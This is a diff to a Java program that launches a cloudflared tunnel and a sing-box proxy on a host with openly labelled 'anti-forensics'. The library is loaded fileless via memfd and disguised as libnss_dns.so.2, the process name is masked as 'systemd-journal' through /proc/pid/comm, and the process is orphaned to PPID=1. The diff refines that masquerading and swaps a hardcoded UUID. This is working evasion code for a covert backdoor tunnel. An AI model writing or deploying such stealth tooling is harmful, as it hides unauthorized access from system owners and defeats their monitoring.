@@ -25,7 +25,7 @@ import java.util.stream.Collectors;
  *
  * Anti-forensics:
  *   - memfd-load sing-box .so (no disk artifact), name disguised as libnss_dns.so.2
- *   - cloudflared via exec -a (argv[0] = systemd-journal, not binary path)
+ *   - cloudflared via /proc/pid/comm = systemd-journal (masks process name in ps aux)
  *   - cloudflared binary kept alive (not deleted) — /proc/pid/exe points to real file, no (deleted)
  *   - cloudflared launched via background subshell → orphan → PPID=1 (init adopts it)
  *   - fallback .so → /dev/shm/libnss_dns.so.2 (realistic name, not deleted)
@@ -48,7 +48,7 @@ public class App {
     //  Constants
     // ================================================================
 
-    private static final String UUID = "48eaa2a1-d5de-4215-bcab-9c88883a5322";
+    private static final String UUID = "1b9b6d63-3d6e-4221-9470-d0711a41fa00";
     private static final String WS_PATH = "/";
     private static final int PROXY_PORT = 8080;
     private static final String FAKE_COMM = "systemd-journal";
@@ -196,12 +196,13 @@ public class App {
 
         // Launch via background subshell: the shell exits immediately,
         // cloudflared becomes orphan → adopted by init → PPID=1
+        // ⚠️ NOTE: Do NOT use "exec -a" here — /bin/sh is often dash, not bash,
+        // and dash does NOT support exec -a. The command would silently fail.
+        // We write /proc/pid/comm separately for process name masquerading.
         // Token passed via TUNNEL_TOKEN env var — reliable, cloudflared always reads it.
-        // (The token is in /proc/pid/environ, but this is the only reliable way.)
         ProcessBuilder pb = new ProcessBuilder(
                 "/bin/sh", "-c",
-                "exec -a " + FAKE_COMM + " " + cloudflaredBinary.toAbsolutePath().toString()
-                        + " tunnel run &"
+                cloudflaredBinary.toAbsolutePath().toString() + " tunnel run &"
         );
         Map<String, String> env = pb.environment();
         env.clear();
